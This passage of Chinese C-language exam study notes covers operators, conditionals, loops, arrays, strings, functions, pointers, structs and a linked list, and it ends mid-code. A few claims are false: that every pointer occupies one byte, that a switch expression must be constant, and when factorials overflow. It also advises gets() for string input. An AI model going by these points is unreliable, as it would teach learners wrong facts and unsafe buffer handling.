语言中，同逻辑表达式一样，关系表达式的值也为逻辑值，即布尔型（bool），取值为真或假。 关系运算符一般不能连用，如果连用将表达不同的含义，如： 1234567891011#include &lt;stdio.h&gt;int main() &#123; int a = 1; int b = 2; int c = 3; int d = a &lt;= b &lt;= c;// a &lt;= b &lt;= c不是表达b的值在[a,b]之间，而是a先和b比较，a&lt;=b所以表达式的值是1，然后1与c比较，1&lt;=c，右值是1，然后赋给左值，所以d的值是1 // 如果要表达b的值在[a,c]之间应该是b &gt;= a &amp;&amp; b &lt;= c printf("%d",d); return 0;&#125; 逻辑运算符 与运算(&amp;&amp;)：参与运算的两个表达式都为真时，结果才为真，否则为假； 或运算(||)：参与运算的两个表达式只要有一个为真，结果就为真；两个表达式都为假时结果才为假； 非运算(!)：参与运算的表达式为真时，结果为假；参与运算的表达式为假时，结果为真。 逻辑运算符和关系运算符与其他运算符的优先级赋值运算符(=) &lt; &amp;&amp;和|| &lt; 关系运算符 &lt; 算术运算符 &lt; 非(!) 布尔表达式求值 确定运算符优先级 确定运算符结合方向 得出值（布尔表达式的值只可能是0或者1） if语句1234567// 形式1——表达式的值不为0，就执行操作1（操作1可包含多条语句），否则什么都不做，往下继续执行if (表达式) &#123; 操作1&#125;// 形式2——表达式的值不为0，就执行语句（只有一条语句），否则什么都不做，往下继续执行if (表达式) 语句; if else语句12345678910// 形式1——表达式的值不为0，就执行操作1，否则执行操作2（操作1,2可包含多条语句）if (表达式) &#123; 操作1&#125; else &#123; 操作2&#125;// 形式二——表达式的值不为0，就执行语句1，否则执行语句2（语句1,2只能是单条语句）if (表达式) 语句1;else 语句2 并列的if else语句123456789101112131415161718/* 如果表达式1的值不为0，就执行操作1 否则判断表达式2的是否为0，如果不为0，执行操作2 否则判断表达式3的值是否为0，如果不为0，执行操作3， ... 否则判断表达式n的值是否为0，如果不为0，执行操作n， 否则执行操作n+1 注意，操作1～n+1中只有一个可以执行*/if (表达式1) &#123; 操作1&#125; else if (表达式2) &#123; 操作2&#125; else if (表达式3) &#123; 操作3&#125; ...else if (表达式n) &#123; 操作n&#125; else &#123; 操作n+1&#125; 嵌套的if else语句123456789101112/*如果表达式1的值不为0，判断表达式2的值是否为0，如果表达式2的值为0，执行操作1，否则判断表达式3的值是否为0，如果不为0，执行操作2，否则执行操作3*/if (表达式1) &#123; if (表达式2) &#123; 操作1 &#125;&#125; else &#123; if (表达式3) &#123; 操作2 &#125; else &#123; 操作3 &#125;&#125; 注意：多种形式的if、if else、并列的if else、嵌套的if else等可以相互组合和嵌套，但是不建议嵌套太多层，那样会减低程序的可阅读性。 switch语句一个 switch 语句允许测试一个变量等于多个值时的情况。每个值称为一个 case，且被测试的变量会对每个 switch case 进行检查。switch 语句的语法： 123456789101112switch(expression)&#123; case constant-expression : statement(s); break; /* 可选的 */ case constant-expression : statement(s); break; /* 可选的 */ /* 可以有任意数量的 case 语句 */ default : /* 可选的 */ statement(s);&#125; switch 语句必须遵循下面的规则： switch 语句中的 expression 是一个常量表达式，必须是一个整型（char本质上属于整型）或枚举类型。 在一个 switch 中可以有任意数量的 case 语句。每个 case 后跟一个要比较的值和一个冒号。 case 的 constant-expression 必须与 switch 中的变量具有相同的数据类型，且必须是一个常量或字面量。 当被测试的变量等于 case 中的常量时，case 后跟的语句将被执行，直到遇到 break 语句为止。 当遇到 break 语句时，switch 终止，控制流（可理解为程序的执行过程）将跳转到 switch 语句后的下一行。 不是每一个 case 都需要包含 break。如果 case 语句不包含 break，控制流将会 继续执行 后续的 case，直到遇到 break 为止。 一个 switch 语句可以有一个可选的 default，一般出现在 switch 的结尾。default 可用于在上面所有 case 都不为真时执行一个任务。default 中的 break 语句不是必需的。 第三模块 循环控制考试大纲的要求（1）掌握for循环；（2）掌握while循环；（3）掌握do-while循环；（4）理解循环结构的流程图表示。 笔记for循环for 循环允许编写一个执行指定次数的循环控制结构。 for 循环的语法： 1234for ( init; condition; increment )&#123; statement(s);&#125; for 循环的控制流： init 会首先被执行，且只会执行一次。这一步允许您声明并初始化任何循环控制变量。您也可以不在这里写任何语句，只要有一个分号出现即可。 接下来，会判断 condition。如果为真，则执行循环主体。如果为假，则不执行循环主体，且控制流会跳转到紧接着 for 循环的下一条语句。 在执行完 for 循环主体后，控制流会跳回上面的 increment 语句。该语句允许您更新循环控制变量。该语句可以留空，只要在条件后有一个分号出现即可。 条件再次被判断。如果为真，则执行循环，这个过程会不断重复（循环主体，然后增加步值，再然后重新判断条件）。在条件变为假时，for 循环终止。 while循环只要给定的条件为真，C 语言中的 while 循环语句会重复执行一个目标语句。 while 循环的语法： 1234while(condition)&#123; statement(s);&#125; statement(s) 可以是一个单独的语句，也可以是几个语句组成的代码块。 condition 可以是任意的表达式，当为任意非零值时都为 true。当条件为 true 时执行循环。 当条件为 false 时，退出循环，程序流将继续执行紧接着循环的下一条语句。 do…while循环不像 for 和 while 循环，它们是在循环头部测试循环条件。在 C 语言中，do…while 循环是在循环的尾部检查它的条件。 do…while 循环与 while 循环类似，但是 do…while 循环会确保至少执行一次循环。 do…while 循环的语法： 12345do&#123; statement(s);&#125;while( condition ); 注意，条件表达式出现在循环的尾部，所以循环中的 statement(s) 会在条件被测试之前至少执行一次。 如果条件为真，控制流会跳转回上面的 do，然后重新执行循环中的 statement(s)。这个过程会不断重复，直到给定条件变为假为止。 死循环如果循环控制流中条件表达式的值永远为true，称为死循环，通常是应该避免的。 常见死循环： 123456789101112131415161718// for形式死循环for(;;) &#123;&#125;for(;1;) &#123;&#125;// while形式死循环while(1) &#123;&#125;// do...while形式死循环do&#123;&#125;while(1); 三种循环语句比较while、do...while和for三种循环在具体的使用场合上有区别，具体如下： 在知道循环次数的情况下更适合使用for循环； 在不知道循环次数的情况下适合使用while或者do-while循环，如果有可能一次都不循环应使用while循环，如果至少循环一次应使用do-while循环; 从本质上讲，while,do...while和for循环之间可以相互转换。 多重循环（循环嵌套）有时候一个循环有可能满足不了需求，或者说使用起来不太方便，如：遍历二维数组时，这个时候我们就需要用到多重循环，多重循环就是在循环结构（含有循环语句的结构就叫循环结构）的循环体中又出现循环结构。 使用break语句跳出循环break 语句，可以跳出循环，还可以跳出 switch。 break 语句不能用于循环语句和 switch 语句之外的任何其他语句中。 在没有循环结构的情况下，break不能用在单独的if else语句中。 在多层循环中，一个break语句只跳出当前循环。 使用break语句，可以跳出死循环。 使用continue语句结束循环continue 的用法十分简单，其作用为结束本次循环，即跳过循环体中下面尚未执行的语句，然后进行下一次是否执行循环的判定。 continue和break的区别continue 语句和 break 语句的区别是，continue 语句只结束本次循环，而不是终止整个循环。 break 语句则是结束整个循环过程，不再判断执行循环的条件是否成立。 而且，continue 只能在循环语句中使用，即只能在 for、while 和 do…while 中使用，除此之外 continue 不能在任何语句中使用。 第四模块 数组的使用考试大纲的要求（1）掌握一维数组；（2）掌握二维数组；（3）理解字符数组与字符串。 笔记数组数组是在内存中连续存储的具有相同类型的一组数据的集合 一维数组语法： 1类型说明符 数组名[正整数常量表达式]; 例如： 1int a[5]; 表示定义了一个整型数组，数组名为 a，定义的数组称为数组 a。数组名 a 除了表示该数组之外，还表示该数组的首地址。 此时数组 a 中有 5 个元素，每个元素都是 int 型变量，而且它们在内存中的地址是连续分配的。也就是说，int 型变量占 4 字节的内存空间，那么 5 个int型变量就占 20 字节的内存空间，而且它们的地址是连续分配（物理相邻）的。 元素就是变量，数组中习惯上称为元素。 定义数组时，需要指定数组中元素的个数。方括号中的正整数常量表达式就是用来指定元素的个数。数组中元素的个数又称数组的长度。 C语音通过给每个数组元素进行编号的方式访问数组中的元素。数组元素的编号又叫下标，访问数组中第5个元素的方式应该是a[4]。 因为数组中的下标是从 0 开始的。 一维数组初始化: 定义数组时给所有元素赋初值，这叫“完全初始化”。例如：1int a[5] = &#123;1, 2, 3, 4, 5&#125;; 通过将数组元素的初值依次放在一对花括号中，初始化之后，a[0]=1；a[1]=2；a[2]=3；a[3]=4；a[4]=5，即从左到右依次赋给每个元素。需要注意的是，初始化时各元素间是用逗号隔开的，不是用分号。 可以只给一部分元素赋值，这叫“不完全初始化”。例如：1int a[5] = &#123;1, 2&#125;; 定义的数组 a 有 5 个元素，但花括号内只提供两个初值，这表示只给前面两个元素 a[0]、a[1] 初始化，而后面三个元素都没有被初始化。值得注意的是，不完全初始化时，没有被初始化的元素自动为 0。 需要注意的是，“不完全初始化”和“完全不初始化（未初始化，即只声明了但未赋值）”不一样。如果“完全不初始化”，即只定义int a[5]；而不初始化，那么各个元素的值就不是0了，所有元素的值都是不确定值。 数组跟变量一样必须先定义，然后使用。 通常用for循环语句遍历数组。 常见错误1： 123456# include &lt;stdio.h&gt;int main() &#123; int a[5]; a[5] = &#123;1, 2, 3, 4, 5&#125;;// 错误的原因是，只有在定义时才可以用大括号初始化 return 0;&#125; 常见错误2： 12345# include &lt;stdio.h&gt;int main() &#123; int a[5] = &#123;1, 2, 3, 4, 5, 6&#125;;// 错误的原因初始化数组超过了数组本身的大小 return 0;&#125; 常见错误3： 12345# include &lt;stdio.h&gt;int main() &#123; int a[5] = &#123;&#125;;// 初始化大括号里面不能什么都不填 return 0;&#125; 二维数组二维数组在逻辑上是数组的数组，即二维数组的每个元素是一个一维数组（一行），在物理上是一维数组，即所有的元素都是连续存储的。从直观上来看，二维数组就是线性代数中的矩阵。 语法： 1类型说明符 数组名[正整数常量表达式1][正整数常量表达式2]; 例如： 1int a[3][4]; 在这个定义的二维数组中，共包含3 * 4个元素，即12个元素。接下来，通过一张图来观察二维数组a的元素分布情况，如图所示： 通过另一张图来观察二维数组a的逻辑结构和存储结构： 同一维数组类似，对数组元素的访问也是用下标，指定行下标（常量表达式）和列下标（常量表达式），行下标和列下标都是从0开始的： 123a[0][0]; //为0行0列元素，注意与习惯上区分开，习惯上的第1对应下标0a[2][1]; //为2行1列元素a[1][1+2]; //为1行3列元素 二维数组的初始化： 先定义，后赋值，在显式赋值之前，二维数组的各数据元素是随机值（不确定）。 123456789// 先定义int a[2][3];// 后赋初值a[0][0]=1;a[0][1]=2;a[0][2]=3;a[1][0]=4;a[1][1]=5;a[1][2]=6; 在定义二维数组的同时，采用初始化列表的形式对其元素赋初值。 12345678910111213141516171819202122232425// 分行给出初始化数据，且每行的初始化数据个数等于列数，这一行代码相当于上面的七行代码int a[2][3]=&#123;&#123;1,2,3&#125;,&#123;4,5,6&#125;&#125;;// 由于初始化列表中明确给出了两行数据，故定义该数组时，其第一维的大小可省略，编译器能间接算出该数组的行数为 2，故依然可以确定其空间大小，因此，在对二维数组进行初始化时，其第一维的大小可以省略，即写成如下形式：// int a[][3]=&#123;&#123;l,2,3&#125;,&#123;4,5,6&#125;&#125;;// 等价于不分行写法，前提是 数组元素的个数（行数 × 列数）= 大括号后面的初始值个数// int a[2][3]=&#123;l,2,3,4,5,6&#125;;// 同样可以省略第一维的大小// int a[][3]=&#123;l,2,3,4,5,6&#125;;// 如果数组元素的个数（行数 × 列数）不等于 大括号后面的初始值个数// int a[][3]=&#123;l,2,3,4,5,6,7&#125;;// 这就相当于// int a[3][3] = &#123;l,2,3,4,5,6,7,0,0&#125;; // 第一维大小可省略// 也相当于// int a[3][3] = &#123;l,2,3,4,5,6,7,0&#125;; // 第一维大小可省略// 还相当于// int a[3][3] = &#123;&#123;l,2,3&#125;,&#123;4,5,6&#125;,&#123;7,0,0&#125;&#125;; // 第一维大小可省略// 同时相当于// int a[3][3] = &#123;&#123;l,2,3&#125;,&#123;4,5,6&#125;,&#123;7&#125;&#125;; // 第一维大小可省略// 最后，还可以相当于先定义，后赋值的形式，这里省略相关代码// 注：某行一行初始值如未写全，那么该行元素，后面的元素会自动被赋予初值0 二维数组初始化常见错误 1234int a[2][] = &#123;&#123;l,2,3&#125;,&#123;4,5,6&#125;&#125;; //错误。不能省略第二维大小int a[][] = &#123;&#123;l,2,3&#125;, &#123;4,5,6&#125;&#125;; //错误。不能省略第二维大小int a[][3]; //错误。没有提供初始化列表时，两维的大小都必须显式给出int a[2][3] = &#123;&#123;l,2,3&#125;,&#123;4,5,6&#125;,&#123;7,8,9&#125;&#125;; //错误。初始行数多于数组行数 通常使用双层for循环，遍历二维数组 字符数组与字符串字符数组用来存放字符的数组称为字符数组。字符数组的各个元素依次存放字符串的各字符,字符数组的数组名代表该数组的首地址,这为处理字符串中个别字符和引用整个字符串提供了极大的方便。字符数组的定义形式与前面介绍的整型数组相同。 语法： 1char c[6]; 在定义时进行初始化赋值: 12// 长度可省略char c[6]=&#123;'c', ' h ', 'i', 'n', 'a' , '\0' &#125;; 先定义后赋值: 12char c[6];c[0]= 'c',c[1]= 'h',c[2]= 'i',c[3]= 'n',c[4]= 'a',c[5]= '\0'; 其中,‘\0’为字符串结束符。如果不对c[5]赋任何值,‘\0’会由编译器自动添加。 如果如果大括号里面的元素个数小于数组的长度，则只将大括号中的字符赋给数组中前面的元素，剩下的内存空间编译器会自动用 ‘\0’ 填充。 字符数组也可采用字符串常量的赋值方式,例如: 123char a[]=&#123;"china"&#125;;// 长度是6，因为最后还有一个结束符'\0'// 等价形式// char a[] = "china";/ 同理，长度是6 scanf %s输入字符数组时，不需要取地址，因为数组名本身就是地址常量。 12char a[10];scanf("%s",a);// scanf %s不能输入带有空格的字符串，会被截断，如果字符串中可能带有空格（回车，tab）字符，用gets函数输入 可以用for循环（其他循环也可以）加printf %c形式输出字符数组的内容，也可以直接用printf %s格式输出字符数组内容。 123456789char a[] = "china";// for循环加printf %c形式输出int i;for (i = 0;i &lt; sizeof(a);i++) &#123; printf("%c",a[i]);&#125;// 直接用printf %s格式输出字符数组printf("%s",a); 字符串C语言中没有字符串这种数据类型，但是可以通过char的数组来替代； 字符串一定是一个char的数组，但char的数组未必是字符串； 数字0(和字符‘\0’等价)结尾的char数组就是一个字符串，但如果char数组没有以数字0结尾，那么就不是一个字符串，只是普通字符数组，所以字符串是一种特殊的char的数组。 内存中字符串以字符数组的形式存在，而数组以指针常量（地址常量）的形式存在，即数组首地址是个很关键的因素。 正是由于数组都是以指针常量的形式存在，所以C语言没有办法对数组的大小进行检查，所以通常，数组越界错误编译器是不会指出来的，但是也有部分高级的编译器会指出warning。 字符串操作函数常用的字符串操作函数如下： 使用字符串操作函数注意事项： 使用前需要先引入头文件#include&lt;string.h&gt;； strlen()获取字符串的长度，在字符串长度中是不包括‘\0’而且汉字和字母的长度是不一样的； strcmp()在比较的时候会把字符串先转换成ASCII码再进行比较,返回的结果为0，表示s1和s2的ASCII码相等,返回结果为1，表示s1比s2的ASCII码大,返回结果为-1，表示s1比s2的ASCII码小； strcpy()拷贝之后会覆盖s1原来的字符串且s1不能是字符串常量； s，s1，s2均为字符指针类型（即可以传递的实参为字符指针，字符数组，字符串常量）。 第五模块 函数的使用考试大纲的要求（1）掌握函数的原型声明、调用及返回；（2）掌握函数参数；（3）理解变量存储特性。 笔记函数函数是学习 C 语言的重点。C 语言的主体和核心，一个是函数，另一个是指针。 简单来说，一个函数就是实现一个功能模块。 每个 C 程序都至少有一个函数，即主函数 main() ，所有简单的程序都可以定义其他额外的函数。主函数main()的功能是程序入口。 函数声明告诉编译器函数的名称、返回类型和参数。函数定义提供函数的实际主体。 语法： 1234return_type function_name( parameter list )&#123; body of the function&#125; 在 C 语言中，函数由一个函数头和一个函数主体组成。下面列出一个函数的所有的组成部分： 返回类型：一个函数可以返回一个值。return_type 是函数返回的值的数据类型。有些函数执行所需的操作而不返回值，在这种情况下，return_type 是 void（即返回值为空，不返回任何值）。 函数名称：这是函数的实际名称。函数名和参数列表一起构成了函数签名。 参数：参数就像是占位符。当函数被调用时，您向参数传递一个值，这个值被称为实际参数。参数列表包括函数参数的类型、顺序、数量。参数是可选的，也就是说，函数可能不包含参数。 函数主体：函数主体包含一组定义函数执行任务的语句。 函数名必须满足标识符的规范。 实例： 1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;#include &lt;stdbool.h&gt;bool isLeapYear(int year);// 函数声明，函数功能是，判断传入的年份是不是闰年，如果是返回1（真），否则返回0（假）int main() &#123; int year; scanf("%d", &amp;year); if (isLeapYear(year)) &#123;// 这里的year是实参，因为这里在调用函数 printf("%d 是闰年", year); &#125; else &#123; printf("%d 不是闰年", year); &#125; return 0;&#125;bool isLeapYear(int year) &#123;// 函数头,bool是函数返回值类型，返回值通常用来控制程序逻辑走向，这里的year是函数参数，形参 // 下面是函数体 if (year % 4 == 0 &amp;&amp; year % 100 != 0) &#123; return 1; &#125; if (year % 100 == 0 &amp;&amp; year % 400 == 0) &#123; return 1; &#125; return 0;&#125; 递归函数一个函数总会在某种情况下调用它本身，这样的函数叫递归函数，递归函数通常可以把问题简化，但是初学者难以理解。 递归函数设计的两个原则： 把大问题转换为子问题（找递推关系式） 递归出口 比如：要求10的阶乘，10的阶乘不好求，因为规模太大了，那我们就想，如果数据规模小一点，变成9的阶乘呢？会不会好求一点呢，然后9的阶乘也不好求，规模还是太大了，那8的阶乘呢？以此类推，最后到1的阶乘，就很好办了，1的阶乘就是1，这就到了递归出口了，这个时候再倒回去，把10的阶乘求出来 代码实现： 1234567891011121314#include &lt;stdio.h&gt;int fac(int n);int main() &#123; printf("%d",fac(5));// 大于等于15的阶乘会溢出 return 0;&#125;int fac(int n) &#123; if (n &lt;= 1) &#123;// 递归出口 return 1; &#125; return n * fac(n - 1);// 递推关系式&#125; 变量存储特性局部变量定义在函数体内部的变量（函数的形参也是局部变量），就是局部变量，每次调用函数局部变量都会被初始化，每次离开函数，局部变量就被销毁，回收空间。 局部变量的作用范围是从定义的位置开始到函数体结束。 全局变量定义在函数体外部的变量，就是全局变量。 全局变量的作用范围是从定义的位置开始到本文件结束。 staticstatic 存储类指示编译器在程序的生命周期内保持局部变量的存在，而不需要在每次它进入和离开作用域时进行创建和销毁。因此，使用 static 修饰局部变量可以在函数调用之间保持局部变量的值。 static 修饰符也可以应用于全局变量。当 static 修饰全局变量时，会使变量的作用域限制在声明它的文件内。 实例： 12345678910111213141516171819202122#include &lt;stdio.h&gt;/* 函数声明 */void func1(void);static int count = 10; /* 全局变量 - static 是默认的 */int main() &#123; while (count--) &#123; func1(); &#125; return 0;&#125;void func1(void) &#123;/* 'thingy' 是 'func1' 的局部变量 - 只初始化一次 * 每次调用函数 'func1' 'thingy' 值不会被重置。 */ static int thingy = 5; thingy++; printf(" thingy 为 %d ， count 为 %d\n", thingy, count);&#125; 输出结果： 12345678910thingy 为 6 ， count 为 9thingy 为 7 ， count 为 8thingy 为 8 ， count 为 7thingy 为 9 ， count 为 6thingy 为 10 ， count 为 5thingy 为 11 ， count 为 4thingy 为 12 ， count 为 3thingy 为 13 ， count 为 2thingy 为 14 ， count 为 1thingy 为 15 ， count 为 0 第六模块 指针的使用考试大纲的要求（1）理解指针的声明与初始化；（2）理解指针与数组；（3）理解字符串与指针。 笔记指针指针是学习 C 语言的另一个重点。C 语言的主体和核心，一个是函数，另一个是指针。 每一个变量都有一个内存位置，每一个内存位置都定义了 &amp; 运算符访问的地址，它表示了在内存中的一个地址。而指针的本质就是地址。 printf %p可以直接输出地址（也就是指针）。 指针变量是一个变量，其值为另一个变量的地址，即，内存位置的直接地址。就像使用其他变量或常量一样，必须在使用指针存储其他变量地址之前，对其进行声明。指针变量通常简称为指针。 语法： 1type *var-name; type 是指针的基类型，它必须是一个有效的 C 数据类型，var-name 是指针变量的名称。用来声明指针的星号 * 与乘法中使用的星号是相同的。但是，在这个语句中，星号是用来指定一个变量是指针。 1234int *ip; /* 一个整型的指针 */double *dp; /* 一个 double 型的指针 */float *fp; /* 一个浮点型的指针 */char *ch; /* 一个字符型的指针 */ 所有实际数据类型，不管是整型、浮点型、字符型，还是其他的数据类型（如：结构体类型），对应指针的值的类型都是一样的，都是一个代表内存地址的长的十六进制数（即：所有指针变量所占用的空间都是一个字节）。 不同数据类型的指针之间唯一的不同是，指针所指向的变量或常量的数据类型不同。 如何使用指针？使用指针时会频繁进行以下几个操作：定义一个指针变量、把变量地址赋值给指针、访问指针变量中可用地址的值。这些是通过使用一元运算符 * 来返回位于操作数所指定地址的变量的值。下面的实例涉及到了这些操作： 123456789101112131415161718#include &lt;stdio.h&gt;int main() &#123; int var = 20; /* 实际变量的声明 */ int *ip; /* 指针变量的声明 */ ip = &amp;var; /* 在指针变量中存储 var 的地址 */ printf("Address of var variable: %p\n", &amp;var); /* 在指针变量中存储的地址 */ printf("Address stored in ip variable: %p\n", ip); /* 使用指针访问值 */ printf("Value of *ip variable: %d\n", *ip); return 0;&#125; 实例执行结果：不同终端（计算机）输出的地址值可能不同 123Address of var variable: 0x7fff7f351a94Address stored in ip variable: 0x7fff7f351a94Value of *ip variable: 20 C 中的 NULL 指针在变量声明的时候，如果没有确切的地址可以赋值，为指针变量赋一个 NULL 值是一个良好的编程习惯。赋为 NULL 值的指针被称为空指针。 NULL 指针是一个定义在标准库中的值为零的常量。有点类似字符串的结束符。 指针变量相关运算和相关概念 概念描述 指针的算术运算可以对指针进行四种算术运算：++（指向下一个位置）、--（指向上一个位置）、+（往后移）、-（往前移） 指针数组可以定义用来存储指针的数组。 指向指针的指针（双重指针）C 允许指向指针的指针。 传递指针给函数通过引用或地址传递参数，使传递的参数在调用函数中可以被改变。 从函数返回指针C 允许函数返回指针到局部变量、静态变量和动态内存分配。 指针与数组数组名就是地址常量（指针常量）。 字符串与字符指针字符串通常是字符数组。 1char name[] = "aaa"; 字符指针通常是指向字符型变量的指针，但C语言还支持直接使用一个字符指针指向字符串。 1char *str = "hello C language"; 字符数组和指向字符串的字符指针的差别： 一句话：字符数组存放在全局数据区或栈区，可读可写。指向字符串的字符指针所指向的字符串存放在常量区，只读不能写。 1234567char *str = "hello";str[1] = 'a';// 错误，尝试修改常量char *str2 = "world";str = str2;// 正确，str是指针变量，可以修改指针变量的指向char a[] = "hello world";a[0] = 'b';// 正确，字符数组的元素可读可写a = str2;// 错误，a为指针常量，不能修改指向的内存地址 第七模块 结构体考试大纲的要求（1）理解结构体变量；（2）了解结构体数组；（3）了解结构体与指针；（4）了解链表的使用。 笔记结构体C 数组允许定义可存储相同类型数据项的变量，结构体是 C 编程中另一种用户自定义的可用的数据类型，它允许存储不同类型的数据项。 结构体用于表示一条记录，比如学生成绩，一条学生成绩信息需要包括：学生姓名（字符数组）、学号（整型），数学成绩（单精度或双精度浮点型），英语成绩（单精度或双精度浮点型），C语言成绩（单精度或双精度浮点型），总分（单精度或双精度浮点型），平均分（单精度或双精度浮点型）。 语法：定义结构体，必须使用 struct 关键字 123456struct tag &#123; member-list member-list member-list ...&#125; variable-list ; tag 是结构体标识符（别名）。 member-list 是标准的变量定义，比如 int i; 或者 float f，或者其他有效的变量定义。 variable-list 结构变量，定义在结构的末尾，最后一个分号之前，您可以指定一个或多个结构变量。下面是声明 Score 结构的方式： 123456789struct Score &#123; int stu_num; char stu_name[10]; double math; double english; double c; double avg; double sum;&#125; someonedScore; 在一般情况下，tag、member-list、variable-list 这 3 部分至少要出现 2 个。以下为实例： 123456789101112131415161718192021222324252627//此声明声明了拥有3个成员的结构体，分别为整型的a，字符型的b和双精度的c//同时又声明了结构体变量s1//这个结构体并没有标明其标签struct &#123; int a; char b; double c;&#125; s1;//此声明声明了拥有3个成员的结构体，分别为整型的a，字符型的b和双精度的c//结构体的标签被命名为SIMPLE,没有声明变量struct SIMPLE &#123; int a; char b; double c;&#125;;//用SIMPLE标签的结构体，另外声明了变量t1、t2、t3（结构体指针）struct SIMPLE t1, t2[20], *t3;//也可以用typedef创建新类型，这个考纲没有要求，大概看看了解以下typedef struct &#123; int a; char b; double c;&#125; Simple2;//现在可以用Simple2作为类型声明新的结构体变量Simple2 u1, u2[20], *u3; 如果两个结构体互相包含，则需要对其中一个结构体进行不完整声明，如下所示： 12345678910111213struct B; //对结构体B进行不完整声明//结构体A中包含指向结构体B的指针struct A &#123; struct B *partner; //other members;&#125;;//结构体B中包含指向结构体A的指针，在A声明完后，B也随之进行声明struct B &#123; struct A *partner; //other members;&#125;; 结构体变量的初始化： 123456789101112#include &lt;stdio.h&gt;struct Books &#123; char title[50]; char author[50]; char subject[100]; int book_id;&#125; book = &#123;"C 语言", "RUNOOB", "编程语言", 123456&#125;;int main() &#123; printf("title : %s\nauthor: %s\nsubject: %s\nbook_id: %d\n", book.title, book.author, book.subject, book.book_id);&#125; 访问结构体成员： 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;stdio.h&gt;#include &lt;string.h&gt;struct Books &#123; char title[50]; char author[50]; char subject[100]; int book_id;&#125;;int main() &#123; struct Books Book1; /* 声明 Book1，类型为 Books */ struct Books Book2; /* 声明 Book2，类型为 Books */ /* Book1 详述 */ strcpy(Book1.title, "C Programming"); strcpy(Book1.author, "Nuha Ali"); strcpy(Book1.subject, "C Programming Tutorial"); Book1.book_id = 6495407; /* Book2 详述 */ strcpy(Book2.title, "Telecom Billing"); strcpy(Book2.author, "Zara Ali"); strcpy(Book2.subject, "Telecom Billing Tutorial"); Book2.book_id = 6495700; /* 输出 Book1 信息 */ printf("Book 1 title : %s\n", Book1.title); printf("Book 1 author : %s\n", Book1.author); printf("Book 1 subject : %s\n", Book1.subject); printf("Book 1 book_id : %d\n", Book1.book_id); /* 输出 Book2 信息 */ printf("Book 2 title : %s\n", Book2.title); printf("Book 2 author : %s\n", Book2.author); printf("Book 2 subject : %s\n", Book2.subject); printf("Book 2 book_id : %d\n", Book2.book_id); return 0;&#125; 指向结构体的指针： 123struct Books *struct_pointer;// 声明指针变量struct_pointer = &amp;Book1;// 初始化指针struct_pointer-&gt;title;// 使用指向该结构的指针访问结构的成员 实例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;stdio.h&gt;#include &lt;string.h&gt;struct Books &#123; char title[50]; char author[50]; char subject[100]; int book_id;&#125;;/* 函数声明 */void printBook(struct Books *book);int main() &#123; struct Books Book1; /* 声明 Book1，类型为 Books */ struct Books Book2; /* 声明 Book2，类型为 Books */ /* Book1 详述 */ strcpy(Book1.title, "C Programming"); strcpy(Book1.author, "Nuha Ali"); strcpy(Book1.subject, "C Programming Tutorial"); Book1.book_id = 6495407; /* Book2 详述 */ strcpy(Book2.title, "Telecom Billing"); strcpy(Book2.author, "Zara Ali"); strcpy(Book2.subject, "Telecom Billing Tutorial"); Book2.book_id = 6495700; /* 通过传 Book1 的地址来输出 Book1 信息 */ printBook(&amp;Book1); /* 通过传 Book2 的地址来输出 Book2 信息 */ printBook(&amp;Book2); return 0;&#125;void printBook(struct Books *book) &#123; printf("Book title : %s\n", book-&gt;title); printf("Book author : %s\n", book-&gt;author); printf("Book subject : %s\n", book-&gt;subject); printf("Book book_id : %d\n", book-&gt;book_id);&#125; 结构体数组： 本质上就是个数组，只不过数组中的元素变成了结构体变量，用法同数组一样，使用下标访问数组元素。 链表链表是一种常见的基础数据结构，结构体指针在这里得到了充分的利用。链表可以动态的进行存储分配，也就是说，链表是一个功能极为强大的数组，他可以在节点中定义多种数据类型，还可以根据需要随意增添，删除，插入节点。链表都有一个头指针，一般以head来表示，存放的是一个地址。链表中的节点分为两类，头结点和一般节点，头结点是没有数据域的。链表中每个节点都分为两部分，一个数据域，一个是指针域。说到这里你应该就明白了，链表就如同车链子一样，head指向第一个元素：第一个元素又指向第二个元素；……，直到最后一个元素，该元素不再指向其它元素，它称为“表尾”，它的地址部分放一个“NULL”（表示“空地址”），链表到此结束。 实例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct node &#123; int data; struct node *next;&#125; LinkList;LinkList *creat(int n) &#123; // 创建链表 LinkList *head, *node, *end;//定义头节点，普通节点，尾部节点； head = (LinkList *) malloc(sizeof(LinkList));//分配地址 end = head; //若是空链表则头尾节点一样 int i = 0; for (; i &lt; n; i++) &#123; node = (LinkList *) malloc(sizeof(LinkList)); scanf("%d", &amp;node-&gt;data); end-&gt;next = node; end = node; &#125; end-&gt;next = NULL;//结束创建 return head;&#125;void change(LinkList *list, int n) &#123;//修改链表中第n个节点的值 LinkList *t = list; int i = 0; while (i &lt; n &amp;&amp; t != NULL) &#123; t = t-&gt;next; i++; &#125; if (t != NULL) &#123; puts("输入要修改的值"); scanf("%d", &amp;t-&gt;data); &#125; else &#123; puts("节点不存在"); &#125;&#125;void delet(LinkList *list, int n) &#123;//删除链表中第n个节点 LinkList *t = list, *in; int i = 0; while (i &lt; n &amp;&amp; t != NULL) &#123; in = t; t = t-&gt;next; i++; &#125; if (t != NULL) &#123; in-&gt;next = t-&gt;next; free(t); &#125; else &#123; puts("节点不存在"); &#125;&#125;void insert(LinkList *list, int n) &#123;// 在链表中第n个节点之后插入一个节点 LinkList *t = list, *in; int i = 0; while (i &lt; n &amp;&amp; t != NULL) &#123; t = t-&gt;next; i++; &#125; if (t != NULL) &#123; in = (LinkList *) malloc(sizeof(LinkList)); puts("输入要插入的值"); scanf("%d", &amp;in-&gt;data); in-&gt;next = t-&gt;next;//填充in节点的指针域，也就是说把in的指针域指向t的下一个节点 t-&gt;next = in;//填充t节点的指针域，把t的指针域重新指向in &#125; else &#123; puts("节点不存在"); &#125;&#125;void print(LinkList *h) &#123;// 输出链表 while (h-&gt;next != NULL) &#123; h = h-&gt;next; printf("%d ", h-&gt;data); &#125; puts("");&#125;int main() &#123; puts("创建具有5个节点的链表"); LinkList *head = creat(5);// 创建具有5个节点的链表 puts("输出链表"); print(head);// 输出链表 puts("删除链表第3个节点"); delet(head,3);// 删除链表第3个节点 puts("输出删除链表第3个节点之后的链表"); print(head);// 输出删除链表第3个节点之后的链表 puts("在链表的第4个节点之后插入一个节点"); insert(head,4);// 在链表的第4个节点之后插入一个节点 puts("输出插入节点之后的链表"); print(head);// 